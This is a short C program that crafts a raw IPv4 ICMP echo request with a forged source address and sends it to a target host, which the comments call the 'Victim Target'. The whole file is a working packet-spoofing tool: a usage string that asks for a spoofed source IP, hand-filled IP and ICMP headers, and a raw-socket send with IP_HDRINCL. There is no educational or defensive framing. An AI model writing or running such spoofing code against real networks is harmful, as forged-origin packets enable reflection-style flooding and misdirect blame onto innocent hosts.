#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>

// Checksum function (Standard Internet Checksum algorithm)
unsigned short checksum(void *b, int len) {    
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <Source IP (Spoofed)> <Target IP>\n", argv[0]);
        return 1;
    }

    // 1. Create Raw Socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock == -1) {
        perror("Failed to create socket");
        exit(1);
    }

    // Packet Buffer
    char packet[4096];
    memset(packet, 0, 4096);

    // Header Pointers
    struct iphdr *iph = (struct iphdr *) packet;
    struct icmp *icmph = (struct icmp *) (packet + sizeof(struct iphdr));

    // 2. Fill IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmp);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_ICMP;
    iph->saddr = inet_addr(argv[1]); // Spoofed Source
    iph->daddr = inet_addr(argv[2]); // Victim Target
    iph->check = 0; // Kernel fills this

    // 3. Fill ICMP Header (Echo Request)
    icmph->icmp_type = ICMP_ECHO; // Type 8
    icmph->icmp_code = 0;
    icmph->icmp_id = htons(1234);
    icmph->icmp_seq = htons(1);
    icmph->icmp_cksum = checksum((unsigned short *)icmph, sizeof(struct icmp));

    // 4. Send Packet
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(argv[2]);

    // Enable IP_HDRINCL to tell kernel we provided the IP header
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }

    if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("Send failed");
    } else {
        printf("Sent Spoofed Ping: %s -> %s\n", argv[1], argv[2]);
    }

    close(sock);
    return 0;
}
